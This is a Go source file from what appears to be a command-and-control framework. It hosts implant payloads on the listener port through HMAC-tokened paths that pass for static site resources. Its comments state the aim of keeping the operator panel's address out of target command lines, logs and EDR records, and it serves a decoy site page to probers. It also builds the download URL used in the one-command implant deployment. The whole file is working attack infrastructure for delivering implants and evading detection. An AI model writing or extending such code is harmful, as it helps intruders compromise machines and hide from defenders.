package api

// 载荷托管（v1.4.3 #15b-B）：把"下载载荷"从面板端口搬到监听器端口。
//
// 解决的问题（issue #15）：一条命令上线里的下载地址长期是
//
//	http://<面板 IP>:<面板端口>/api/v1/implant/payload/build-1793...
//
// 目标机的命令行、日志、EDR 记录里直接出现面板入口与接口路径，等于自曝。
//
// 现在的形态：
//
//	http://<监听器主机>:<监听器端口>/<prefix>/<token>/<文件名>
//
//   - 路径不含 `/api/v1`，也不含面板端口，看起来就是站点下的一个静态资源；
//   - token = hex(HMAC-SHA256(密钥, "payload:"+buildID))[:12]，由 buildID 决定，
//     **同一个载荷的 URL 永久稳定、可重复下载**（服务端重启后也一样，无需落库）；
//   - 只有知道 buildID 的人能算出 token（密钥不对外），逐一枚举也不现实；
//   - `listener.payload_url_ttl` > 0 时才按载荷创建时间做过期（默认 0 = 永久）。
//
// 安全边界：本处理器与面板的 `/api/v1/implant/payload/{id}` 读的是同一份产物，
// 走同一个 `serveStoredImplant`（含 resolveInDir 目录边界断言与单段文件名校验），
// 因此**不新增**任意文件读面；区别只是"从哪个端口、哪个路径暴露"。

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"toshell/internal/server/database"
	"toshell/internal/server/logging"
)

// SetPayloadHostReady 标记「HTTP 监听器确实在跑」（v1.4.3 #15b-B）。
//
// 为什么需要：监听器端口是 TCP 与 HTTP **互斥**的（TCP 起得来就跳过 HTTP）。
// 只有 HTTP 监听器真的在监听时，`/<prefix>/<token>/<name>` 才有人应答。
func (s *Server) SetPayloadHostReady(ok bool) {
	s.payloadHostReady.Store(ok)
}

// SetPayloadHostPort 记录独立托管端口的实际监听端口（v1.4.3）。
// 只有它真的绑定成功才会被调用；0 表示走「HTTP 监听器端口」或不可用。
func (s *Server) SetPayloadHostPort(port uint16) {
	s.payloadHostPort.Store(uint32(port))
}

// PayloadHostRoute 返回托管路由所需的三件套，供 main.go 启动独立托管端口：
// prefix（已归一化，空 = 未启用）、handler、是否可用。
//
// 可用条件是「开关打开 + 前缀合法 + 有稳定密钥」；端口绑定成功与否由调用方决定。
func (s *Server) PayloadHostRoute() (string, func(http.ResponseWriter, *http.Request, string) bool, bool) {
	if s.cfg == nil || !s.cfg.Listener.PayloadHostEnabled {
		return "", nil, false
	}
	p := strings.Trim(strings.TrimSpace(s.cfg.Listener.PayloadHostPrefix), "/")
	if p == "" {
		p = "s"
	}
	for _, r := range p {
		ok := (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
			r == '.' || r == '_' || r == '-'
		if !ok {
			return "", nil, false
		}
	}
	if s.payloadHostSecret() == nil {
		return "", nil, false
	}
	return p, s.HostedPayloadHandler, true
}

// payloadHostToken 计算某次构建的托管 token（12 字节 hex）。
// 空 ID 返回空串（调用方据此回退到面板地址）。
func (s *Server) payloadHostToken(buildID string) string {
	if buildID == "" || s.cfg == nil {
		return ""
	}
	secret := s.payloadHostSecret()
	if len(secret) == 0 {
		return ""
	}
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte("payload:" + buildID))
	return hex.EncodeToString(mac.Sum(nil))[:12]
}

// payloadHostSecret 返回托管 URL 的 HMAC 密钥。
//
// 优先 listener.encryption_key（协议密钥，本来就必须保密），其次 auth.jwt_key。
// 两者都空说明这套部署没有任何稳定密钥，此时**关闭托管**（返回 nil），
// 让调用方回退到面板地址 —— 不要用"常量密钥"凑一个看起来安全的 URL。
func (s *Server) payloadHostSecret() []byte {
	if s.cfg == nil {
		return nil
	}
	if k := strings.TrimSpace(s.cfg.Listener.EncryptionKey); k != "" {
		return []byte("payload-host:" + k)
	}
	if k := strings.TrimSpace(s.cfg.Auth.JWTKey); k != "" {
		return []byte("payload-host:" + k)
	}
	return nil
}

// payloadHostPrefix 返回归一化后的托管前缀（空 = 未启用）。
func (s *Server) payloadHostPrefix() string {
	if s.cfg == nil || !s.cfg.Listener.PayloadHostEnabled {
		return ""
	}
	// 两种可用形态：独立托管端口（已绑定成功），或 HTTP 监听器在跑。
	// 两者都没有时签出的地址没人应答（端口被 TCP 监听器占着），回退面板地址。
	if s.payloadHostPort.Load() == 0 && !s.payloadHostReady.Load() {
		return ""
	}
	p := strings.Trim(strings.TrimSpace(s.cfg.Listener.PayloadHostPrefix), "/")
	if p == "" {
		p = "s"
	}
	for _, r := range p {
		ok := (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
			r == '.' || r == '_' || r == '-'
		if !ok {
			return ""
		}
	}
	if s.payloadHostSecret() == nil {
		return ""
	}
	return p
}

// hostedPayloadURL 返回某载荷的托管下载地址；不适用时返回空串。
//
// 主机取 listener.public_host（对外域名，可含端口），未配置时用请求的 Host 去掉端口，
// 端口固定用 listener.port —— 因为签发的 URL 是给**目标机**用的，必须指向监听器端口
// 而不是面板端口。
func (s *Server) hostedPayloadURL(r *http.Request, imp *database.StoredImplant) string {
	prefix := s.payloadHostPrefix()
	if prefix == "" || imp == nil {
		return ""
	}
	token := s.payloadHostToken(imp.ID)
	if token == "" {
		return ""
	}
	name := imp.Filename
	if !isSingleSegmentName(name) {
		// DB 里的历史脏行（含子目录/路径分隔符）不拿来做 URL 末段
		name = imp.Name + payloadExt(imp.Format, imp.OS)
		if !isSingleSegmentName(name) {
			return ""
		}
	}

	scheme := "http"
	if s.cfg.Listener.TLSEnabled {
		scheme = "https"
	}

	host := strings.TrimSpace(s.cfg.Listener.PublicHost)
	if host != "" {
		// public_host 允许写成 "c2.example.com" 或 "c2.example.com:8443" 或带 scheme
		if i := strings.Index(host, "://"); i >= 0 {
			scheme = host[:i]
			host = host[i+3:]
		}
		if h, _, err := net.SplitHostPort(host); err == nil {
			host = h
		}
		host = strings.Trim(host, "/")
	} else {
		host = defaultHostFromRequest(r)
	}
	if host == "" {
		return ""
	}
	// 端口优先用「独立托管端口」，其次用「HTTP 监听器端口」。
	port := uint16(s.payloadHostPort.Load())
	if port == 0 {
		port = s.cfg.Listener.Port
	}
	if port == 0 {
		return ""
	}
	return (&url.URL{
		Scheme: scheme,
		Host:   net.JoinHostPort(host, itoaUint16(port)),
		Path:   "/" + prefix + "/" + token + "/" + name,
	}).String()
}

// payloadPanelURL 面板端口上的老下载地址（兼容路径，始终可用）。
func payloadPanelURL(buildID string) string {
	return "/api/v1/implants/stored/" + url.PathEscape(buildID)
}

// payloadOneLinerURL 一条命令上线里用的下载地址：
// 托管可用 → 监听器端口地址；否则回退到面板的 /api/v1/implant/payload/<id>。
func (s *Server) payloadOneLinerURL(r *http.Request, fallbackBase string, imp *database.StoredImplant) string {
	if u := s.hostedPayloadURL(r, imp); u != "" {
		return u
	}
	return strings.TrimRight(fallbackBase, "/") + "/api/v1/implant/payload/" + url.PathEscape(imp.ID)
}

// HostedPayloadHandler 处理监听器上的 /<prefix>/<token>/<文件名>。
//
// 返回 true 表示已写出响应（命中或明确拒绝），false 表示"不认识这个路径"，
// 由监听器回退到拟态响应 —— 这样探测者拿到的是站点诱饵页，而不是 404 JSON。
func (s *Server) HostedPayloadHandler(w http.ResponseWriter, r *http.Request, rest string) bool {
	prefix := s.payloadHostPrefix()
	if prefix == "" {
		return false
	}
	token, name := splitHostedPath(rest)
	if len(token) != 12 || !isLowerHex(token) {
		return false
	}

	db := database.Get()
	if db == nil {
		return false
	}
	imps, err := db.ListImplants()
	if err != nil {
		logging.Warn("builder", "载荷托管：读取载荷列表失败: %v", err)
		return false
	}
	var hit *database.StoredImplant
	for _, imp := range imps {
		if imp == nil {
			continue
		}
		if s.payloadHostToken(imp.ID) == token {
			hit = imp
			break
		}
	}
	if hit == nil {
		return false
	}
	// 记录里的文件名与 URL 末段不一致：说明有人在猜/改写路径，按"不存在"处理。
	if name != "" && !strings.EqualFold(name, hit.Filename) &&
		!strings.EqualFold(name, hit.Name+payloadExt(hit.Format, hit.OS)) {
		logging.Warn("builder", "载荷托管：路径末段与记录不一致（token 命中 %s），按不存在处理", hit.ID)
		return false
	}

	// 可选 TTL（默认 0 = 永久，满足"可重复使用"）。
	if ttl := s.cfg.Listener.PayloadURLTTL; ttl > 0 && hit.CreatedAt > 0 {
		if time.Since(time.Unix(hit.CreatedAt, 0)) > time.Duration(ttl)*time.Second {
			http.Error(w, `{"error":"payload link expired"}`, http.StatusGone)
			return true
		}
	}

	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	s.serveStoredImplant(w, r, hit)
	return true
}

// splitHostedPath 把 "token/name" 拆成两段（name 可缺省）。
func splitHostedPath(rest string) (token, name string) {
	rest = strings.TrimPrefix(rest, "/")
	if i := strings.IndexByte(rest, '/'); i >= 0 {
		return rest[:i], rest[i+1:]
	}
	return rest, ""
}

func isLowerHex(s string) bool {
	for _, r := range s {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f')) {
			return false
		}
	}
	return len(s) > 0
}

// isSingleSegmentName 判断是否"纯文件名"（不含路径分隔符与控制字符）。
func isSingleSegmentName(name string) bool {
	if name == "" || name == "." || name == ".." {
		return false
	}
	if strings.ContainsAny(name, `/\:`) {
		return false
	}
	for _, r := range name {
		if r < 0x20 || r == 0x7f {
			return false
		}
	}
	return true
}

// defaultHostFromRequest 从请求里取主机名（去掉端口），用于未配置 public_host 时拼 URL。
func defaultHostFromRequest(r *http.Request) string {
	if r == nil {
		return ""
	}
	host := r.Host
	if h, _, err := net.SplitHostPort(host); err == nil {
		host = h
	}
	return strings.Trim(host, "[]")
}

// itoaUint16 端口转字符串（避免为了一个端口引入 strconv 到本文件）。
func itoaUint16(v uint16) string {
	if v == 0 {
		return "0"
	}
	var buf [5]byte
	i := len(buf)
	for v > 0 {
		i--
		buf[i] = byte('0' + v%10)
		v /= 10
	}
	return string(buf[i:])
}
